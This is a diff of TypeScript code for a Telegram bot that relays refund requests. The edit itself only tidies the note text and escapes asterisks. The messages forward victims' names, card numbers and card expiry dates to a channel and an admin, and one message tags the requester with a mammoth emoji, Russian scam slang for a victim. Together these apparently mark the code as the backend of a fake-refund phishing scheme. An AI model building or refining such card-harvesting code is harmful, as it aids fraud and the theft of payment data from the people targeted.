@@ -445,10 +445,14 @@ export async function sendRefundRequestNotification(
     return { success: false };
   }
 
+  const note = refund.refundNote && refund.refundNote.trim() && refund.refundNote !== 'Возврат' 
+    ? refund.refundNote 
+    : 'Без примечания';
+  
   const message = `🔔🦣 запросил возврат средств🔔
 ФИО: ${refund.customerName || 'Не указано'}  
 Сумма: ${refund.amount} руб.
-${refund.refundNote || 'Возврат'}`;
+${note}`;
 
   try {
     const sentMessage = await telegramBot.sendMessage(CHANNEL_ID, message);
@@ -468,13 +472,17 @@ export async function sendRefundToAdmin(
     return { success: false };
   }
 
+  const note = refund.refundNote && refund.refundNote.trim() && refund.refundNote !== 'Возврат' 
+    ? refund.refundNote 
+    : 'Без примечания';
+
   const message = `💰 *Заявка на возврат средств*
 
 👤 *ФИО:* ${escapeMarkdown(refund.customerName || 'Не указано')}
 💵 *Сумма:* ${refund.amount} руб.
-💳 *Карта:* ****${refund.cardNumber || '----'}
+💳 *Карта:* \\*\\*\\*\\*${refund.cardNumber || '----'}
 📅 *Срок:* ${refund.cardExpiry || '--/--'}
-📝 *Примечание:* ${escapeMarkdown(refund.refundNote || 'Возврат')}`;
+📝 *Примечание:* ${escapeMarkdown(note)}`;
 
   const keyboard = {
     inline_keyboard: [
